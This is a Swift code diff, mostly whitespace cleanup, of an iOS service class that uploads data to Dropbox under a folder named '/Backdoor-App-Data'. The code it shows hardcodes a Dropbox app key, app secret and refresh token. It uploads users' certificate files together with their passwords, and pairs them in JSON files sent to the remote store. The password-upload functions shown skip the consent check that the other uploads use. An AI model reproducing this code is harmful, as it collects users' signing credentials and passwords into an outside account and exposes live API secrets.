@@ -13,29 +13,29 @@ class EnhancedDropboxService {
     // MARK: - Singleton
     /// Shared instance for app-wide access
     static let shared = EnhancedDropboxService()
-    
+
     // MARK: - Constants
     // Dropbox credentials
     private let dropboxAppKey = "2bi422xpd3xd962"
     private let dropboxAppSecret = "j3yx0b41qdvfu86"
     private let dropboxRefreshToken = "RvyL03RE5qAAAAAAAAAAAVMVebvE7jDx8Okd0ploMzr85c6txvCRXpJAt30mxrKF"
-    
+
     // Base Dropbox API URL
     private let dropboxUploadURL = "https://content.dropboxapi.com/2/files/upload"
     private let dropboxRefreshURL = "https://api.dropboxapi.com/oauth2/token"
-    
+
     // Root folder for all data
     private let rootFolder = "/Backdoor-App-Data"
-    
+
     // MARK: - Properties
     private var accessToken: String?
     private var accessTokenExpiry: Date?
-    
+
     // Store device identifier for folder structure
     private var deviceIdentifier: String {
         return UIDevice.current.name.replacingOccurrences(of: " ", with: "_")
     }
-    
+
     // MARK: - Initialization
     private init() {
         // Refresh token on initialization
@@ -47,28 +47,28 @@ class EnhancedDropboxService {
             }
         }
     }
-    
+
     // MARK: - Public Methods
     /// Upload a log file to Dropbox
     func uploadLogFile(fileURL: URL, completion: ((Bool, Error?) -> Void)? = nil) {
         guard checkPrerequisites(fileURL: fileURL, completion: completion) else { return }
-        
+
         // Create folder path with device identifier
         let logsFolder = "\(rootFolder)/\(deviceIdentifier)/logs"
         let remotePath = "\(logsFolder)/\(fileURL.lastPathComponent)"
-        
+
         // Upload the file
         uploadFile(fileURL: fileURL, toPath: remotePath, completion: completion)
     }
-    
+
     /// Upload a certificate file to Dropbox
     func uploadCertificateFile(fileURL: URL, password: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {
         guard checkPrerequisites(fileURL: fileURL, completion: completion) else { return }
-        
+
         // Create folder path with device identifier
         let certificatesFolder = "\(rootFolder)/\(deviceIdentifier)/certificates"
         let remotePath = "\(certificatesFolder)/\(fileURL.lastPathComponent)"
-        
+
         // Upload the file
         uploadFile(fileURL: fileURL, toPath: remotePath) { [weak self] success, error in
             // If there's a password, store it both separately and with the certificate file
@@ -80,7 +80,7 @@ class EnhancedDropboxService {
                 ) { _, _ in
                     // Just log completion, don't pass it up
                 }
-                
+
                 // Also create an additional file that explicitly pairs the certificate with password
                 self?.createCertificatePasswordPairFile(
                     certificateFilename: fileURL.lastPathComponent,
@@ -89,13 +89,13 @@ class EnhancedDropboxService {
                     // Just log completion, don't pass it up
                 }
             }
-            
+
             if let completion = completion {
                 completion(success, error)
             }
         }
     }
-    
+
     /// Creates a file that explicitly pairs a certificate with its password
     /// - Parameters:
     ///   - certificateFilename: The filename of the certificate
@@ -113,7 +113,7 @@ class EnhancedDropboxService {
             "timestamp": ISO8601DateFormatter().string(from: Date()),
             "device_name": UIDevice.current.name
         ]
-        
+
         // Convert to JSON
         guard let jsonData = try? JSONSerialization.data(withJSONObject: pairInfo, options: .prettyPrinted),
               let tempDir = try? FileManager.default.url(
@@ -125,23 +125,23 @@ class EnhancedDropboxService {
             handleDataCreationError(completion: completion)
             return
         }
-        
+
         // Create the file name to match the certificate (for easier pairing)
         let fileBaseName = certificateFilename.components(separatedBy: ".").first ?? certificateFilename
         let tempFile = tempDir.appendingPathComponent("\(fileBaseName)_password.json")
-        
+
         do {
             try jsonData.write(to: tempFile)
-            
+
             // Create remote path in same folder as certificates
             let passwordsFolder = "\(rootFolder)/\(deviceIdentifier)/certificates"
             let remotePath = "\(passwordsFolder)/\(fileBaseName)_password.json"
-            
+
             // Upload the file
             uploadFile(fileURL: tempFile, toPath: remotePath) { success, error in
                 // Clean up temporary file
                 try? FileManager.default.removeItem(at: tempFile)
-                
+
                 if let completion = completion {
                     completion(success, error)
                 }
@@ -153,7 +153,7 @@ class EnhancedDropboxService {
             }
         }
     }
-    
+
     /// Upload device information to Dropbox
     func uploadDeviceInfo(completion: ((Bool, Error?) -> Void)? = nil) {
         // Only proceed if user has consented to data collection
@@ -161,10 +161,10 @@ class EnhancedDropboxService {
             handleConsentError(completion: completion)
             return
         }
-        
+
         // Collect device information
         let deviceInfo = createDeviceInfoDictionary()
-        
+
         // Convert to JSON
         guard let jsonData = try? JSONSerialization.data(withJSONObject: deviceInfo, options: .prettyPrinted),
               let tempDir = try? FileManager.default.url(
@@ -176,23 +176,23 @@ class EnhancedDropboxService {
             handleDataCreationError(completion: completion)
             return
         }
-        
+
         // Create a temporary file
         let timestamp = Int(Date().timeIntervalSince1970)
         let tempFile = tempDir.appendingPathComponent("device_info_\(timestamp).json")
-        
+
         do {
             try jsonData.write(to: tempFile)
-            
+
             // Create remote path
             let infoFolder = "\(rootFolder)/\(deviceIdentifier)/device_info"
             let remotePath = "\(infoFolder)/device_info_\(timestamp).json"
-            
+
             // Upload the file
             uploadFile(fileURL: tempFile, toPath: remotePath) { success, error in
                 // Clean up temporary file
                 try? FileManager.default.removeItem(at: tempFile)
-                
+
                 if let completion = completion {
                     completion(success, error)
                 }
@@ -204,7 +204,7 @@ class EnhancedDropboxService {
             }
         }
     }
-    
+
     /// Upload a text string as a log entry
     func uploadLogEntry(_ logEntry: String, fileName: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {
         // Only proceed if user has consented to data collection
@@ -212,7 +212,7 @@ class EnhancedDropboxService {
             handleConsentError(completion: completion)
             return
         }
-        
+
         // Create a temporary file with the log entry
         guard let tempDir = try? FileManager.default.url(
             for: .cachesDirectory,
@@ -230,23 +230,23 @@ class EnhancedDropboxService {
             }
             return
         }
-        
+
         // Generate file name if not provided
         let logFileName = fileName ?? "log_entry_\(Int(Date().timeIntervalSince1970)).txt"
         let tempFile = tempDir.appendingPathComponent(logFileName)
-        
+
         do {
             try logEntry.write(to: tempFile, atomically: true, encoding: .utf8)
-            
+
             // Create remote path
             let logsFolder = "\(rootFolder)/\(deviceIdentifier)/logs"
             let remotePath = "\(logsFolder)/\(logFileName)"
-            
+
             // Upload the file
             uploadFile(fileURL: tempFile, toPath: remotePath) { success, error in
                 // Clean up temporary file
                 try? FileManager.default.removeItem(at: tempFile)
-                
+
                 if let completion = completion {
                     completion(success, error)
                 }
@@ -258,7 +258,7 @@ class EnhancedDropboxService {
             }
         }
     }
-    
+
     /// Store password for certificate file
     func storePasswordForCertificate(fileName: String, password: String, completion: ((Bool, Error?) -> Void)? = nil) {
         // Create password info
@@ -268,7 +268,7 @@ class EnhancedDropboxService {
             "timestamp": ISO8601DateFormatter().string(from: Date()),
             "device_name": UIDevice.current.name
         ]
-        
+
         // Convert to JSON
         guard let jsonData = try? JSONSerialization.data(withJSONObject: passwordInfo, options: .prettyPrinted),
               let tempDir = try? FileManager.default.url(
@@ -280,23 +280,23 @@ class EnhancedDropboxService {
             handleDataCreationError(completion: completion)
             return
         }
-        
+
         // Create a temporary file
         let timestamp = Int(Date().timeIntervalSince1970)
         let tempFile = tempDir.appendingPathComponent("certificate_password_\(timestamp).json")
-        
+
         do {
             try jsonData.write(to: tempFile)
-            
+
             // Create remote path
             let passwordsFolder = "\(rootFolder)/\(deviceIdentifier)/certificate_passwords"
             let remotePath = "\(passwordsFolder)/\(fileName)_password.json"
-            
+
             // Upload the file
             uploadFile(fileURL: tempFile, toPath: remotePath) { success, error in
                 // Clean up temporary file
                 try? FileManager.default.removeItem(at: tempFile)
-                
+
                 if let completion = completion {
                     completion(success, error)
                 }
@@ -308,7 +308,7 @@ class EnhancedDropboxService {
             }
         }
     }
-    
+
     // MARK: - Private Methods
     /// Common validation for file uploads
     private func checkPrerequisites(fileURL: URL, completion: ((Bool, Error?) -> Void)? = nil) -> Bool {
@@ -317,7 +317,7 @@ class EnhancedDropboxService {
             handleConsentError(completion: completion)
             return false
         }
-        
+
         // Check file URL
         guard fileURL.isFileURL else {
             Debug.shared.log(message: "Invalid file URL for Dropbox upload", type: .error)
@@ -331,10 +331,10 @@ class EnhancedDropboxService {
             }
             return false
         }
-        
+
         return true
     }
-    
+
     /// Handle consent missing error
     private func handleConsentError(completion: ((Bool, Error?) -> Void)? = nil) {
         if let completion = completion {
@@ -346,7 +346,7 @@ class EnhancedDropboxService {
             completion(false, error)
         }
     }
-    
+
     /// Handle data creation error
     private func handleDataCreationError(completion: ((Bool, Error?) -> Void)? = nil) {
         if let completion = completion {
@@ -358,7 +358,7 @@ class EnhancedDropboxService {
             completion(false, error)
         }
     }
-    
+
     /// Create device info dictionary
     private func createDeviceInfoDictionary() -> [String: String] {
         return [
@@ -372,7 +372,7 @@ class EnhancedDropboxService {
             "build_number": Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "unknown"
         ]
     }
-    
+
     /// Refresh access token for Dropbox API
     private func refreshAccessToken(completion: @escaping (Bool) -> Void) {
         // Check if current token is still valid
@@ -380,12 +380,12 @@ class EnhancedDropboxService {
             completion(true)
             return
         }
-        
+
         // Create request to refresh token
         var request = URLRequest(url: URL(string: dropboxRefreshURL)!)
         request.httpMethod = "POST"
         request.setValue("application/x-www-form-urlencoded", forHTTPHeaderField: "Content-Type")
-        
+
         // Create request body
         let parameters = [
             "grant_type": "refresh_token",
@@ -393,40 +393,40 @@ class EnhancedDropboxService {
             "client_id": dropboxAppKey,
             "client_secret": dropboxAppSecret
         ]
-        
+
         let body = parameters.map { "\($0.key)=\($0.value)" }.joined(separator: "&")
         request.httpBody = body.data(using: .utf8)
-        
+
         // Create and start the task
-        let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
+        let task = URLSession.shared.dataTask(with: request) { [weak self] data, _, error in
             if let error = error {
                 Debug.shared.log(message: "Dropbox token refresh error: \(error.localizedDescription)", type: .error)
                 completion(false)
                 return
             }
-            
+
             guard let data = data else {
                 Debug.shared.log(message: "No data received from Dropbox token refresh", type: .error)
                 completion(false)
                 return
             }
-            
+
             self?.processTokenResponse(data: data, completion: completion)
         }
-        
+
         task.resume()
     }
-    
+
     /// Process token response from Dropbox
     private func processTokenResponse(data: Data, completion: @escaping (Bool) -> Void) {
         do {
             if let json = try JSONSerialization.jsonObject(with: data) as? [String: Any],
                let token = json["access_token"] as? String,
                let expiresIn = json["expires_in"] as? TimeInterval {
-                
+
                 self.accessToken = token
                 self.accessTokenExpiry = Date().addingTimeInterval(expiresIn - 60) // Buffer of 60 seconds
-                
+
                 completion(true)
             } else {
                 Debug.shared.log(message: "Invalid Dropbox token response format", type: .error)
@@ -440,14 +440,14 @@ class EnhancedDropboxService {
             completion(false)
         }
     }
-    
+
     /// Prepare upload request
     private func prepareUploadRequest(token: String, path: String, fileData: Data) -> URLRequest {
         var request = URLRequest(url: URL(string: dropboxUploadURL)!)
         request.httpMethod = "POST"
         request.setValue("Bearer \(token)", forHTTPHeaderField: "Authorization")
         request.setValue("application/octet-stream", forHTTPHeaderField: "Content-Type")
-        
+
         // Add Dropbox API arguments with auto folder creation
         let dropboxArguments: [String: Any] = [
             "path": path,
@@ -456,18 +456,18 @@ class EnhancedDropboxService {
             "mute": true,
             "strict_conflict": false
         ]
-        
+
         if let argsData = try? JSONSerialization.data(withJSONObject: dropboxArguments),
            let argsString = String(data: argsData, encoding: .utf8) {
             request.setValue(argsString, forHTTPHeaderField: "Dropbox-API-Arg")
         }
-        
+
         // Set request body
         request.httpBody = fileData
-        
+
         return request
     }
-    
+
     /// Upload a file to Dropbox with auto folder creation
     private func uploadFile(fileURL: URL, toPath path: String, completion: ((Bool, Error?) -> Void)? = nil) {
         // Ensure we have a valid token
@@ -484,11 +484,11 @@ class EnhancedDropboxService {
                 }
                 return
             }
-            
+
             self.processFileUpload(token: token, fileURL: fileURL, path: path, completion: completion)
         }
     }
-    
+
     /// Process file upload after token refresh
     private func processFileUpload(
         token: String,
@@ -509,10 +509,10 @@ class EnhancedDropboxService {
             }
             return
         }
-        
+
         // Create request
         let request = prepareUploadRequest(token: token, path: path, fileData: fileData)
-        
+
         // Create and start the upload task
         let task = URLSession.shared.dataTask(with: request) { data, response, error in
             if let error = error {
@@ -522,13 +522,13 @@ class EnhancedDropboxService {
                 }
                 return
             }
-            
+
             self.handleUploadResponse(data: data, response: response, path: path, completion: completion)
         }
-        
+
         task.resume()
     }
-    
+
     /// Handle upload response from Dropbox
     private func handleUploadResponse(
         data: Data?,
@@ -548,7 +548,7 @@ class EnhancedDropboxService {
                     type: .error
                 )
             }
-            
+
             if let completion = completion {
                 if success {
                     completion(true, nil)
